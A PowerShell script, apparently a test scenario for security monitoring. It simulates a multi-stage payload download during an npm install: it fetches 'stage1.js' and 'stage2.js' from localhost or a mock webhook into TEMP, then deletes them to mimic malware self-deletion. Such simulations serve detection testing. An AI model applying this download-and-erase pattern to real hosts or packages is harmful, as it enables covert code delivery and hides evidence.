#Requires -Version 5.1
<#
.SYNOPSIS
    Scenario 5: Multi-Stage Payload Download
.DESCRIPTION
    Downloads multiple stage payloads from different endpoints
#>

Write-Host "Scenario 5: Multi-Stage Payload Download" -ForegroundColor Yellow

# Determine stage URLs
if (-not $env:STAGE1_URL -or -not $env:STAGE2_URL) {
    if ($env:MOCK_WEBHOOK -and $env:MOCK_WEBHOOK -match '^https?://') {
        if ($env:MOCK_WEBHOOK -match '^https?://(localhost|127\.0\.0\.1)') {
            $env:STAGE1_URL = if ($env:STAGE1_URL) { $env:STAGE1_URL } else { "http://localhost:8080/install" }
            $env:STAGE2_URL = if ($env:STAGE2_URL) { $env:STAGE2_URL } else { "http://localhost:8080/config" }
        } else {
            $env:STAGE1_URL = if ($env:STAGE1_URL) { $env:STAGE1_URL } else { "$($env:MOCK_WEBHOOK)?stage=install" }
            $env:STAGE2_URL = if ($env:STAGE2_URL) { $env:STAGE2_URL } else { "$($env:MOCK_WEBHOOK)?stage=config" }
        }
    } else {
        $env:STAGE1_URL = if ($env:STAGE1_URL) { $env:STAGE1_URL } else { "http://localhost:8080/install" }
        $env:STAGE2_URL = if ($env:STAGE2_URL) { $env:STAGE2_URL } else { "http://localhost:8080/config" }
    }
}

Write-Host "Stage 1 URL: $env:STAGE1_URL" -ForegroundColor Gray
Write-Host "Stage 2 URL: $env:STAGE2_URL" -ForegroundColor Gray

# Initialize npm project
try {
    npm init -y 2>$null | Out-Null
}
catch {
    # Ignore errors
}

# Start background npm install
$installJob = Start-Job -ScriptBlock {
    try {
        npm install test-package 2>$null
    }
    catch {
        # Expected to fail
    }
}

Start-Sleep -Seconds 1

# Download Stage 1
Write-Host "Downloading Stage 1 payload..." -ForegroundColor Cyan
$stage1Path = "$env:TEMP\stage1.js"
try {
    Invoke-WebRequest -Uri $env:STAGE1_URL -OutFile $stage1Path -TimeoutSec 10
    Write-Host "Stage 1 downloaded to $stage1Path" -ForegroundColor Green
}
catch {
    Write-Host "Stage 1 download failed (expected in some configurations)" -ForegroundColor Yellow
    # Create dummy file for simulation
    "// Stage 1 payload simulation" | Out-File -FilePath $stage1Path -Encoding UTF8
}

Start-Sleep -Seconds 2

# Download Stage 2
Write-Host "Downloading Stage 2 payload..." -ForegroundColor Cyan
$stage2Path = "$env:TEMP\stage2.js"
try {
    Invoke-WebRequest -Uri $env:STAGE2_URL -OutFile $stage2Path -TimeoutSec 10
    Write-Host "Stage 2 downloaded to $stage2Path" -ForegroundColor Green
}
catch {
    Write-Host "Stage 2 download failed (expected in some configurations)" -ForegroundColor Yellow
    # Create dummy file for simulation
    "// Stage 2 payload simulation" | Out-File -FilePath $stage2Path -Encoding UTF8
}

Start-Sleep -Seconds 1

# Simulate payload execution and cleanup
Write-Host "Simulating payload execution and cleanup..." -ForegroundColor Red

# Remove downloaded files (simulating self-deletion)
if (Test-Path $stage1Path) {
    Remove-Item $stage1Path -Force
    Write-Host "Stage 1 payload deleted" -ForegroundColor Gray
}

if (Test-Path $stage2Path) {
    Remove-Item $stage2Path -Force
    Write-Host "Stage 2 payload deleted" -ForegroundColor Gray
}

# Clean up background job
$installJob | Stop-Job -PassThru | Remove-Job -Force

Write-Host "Scenario 5 complete" -ForegroundColor Green
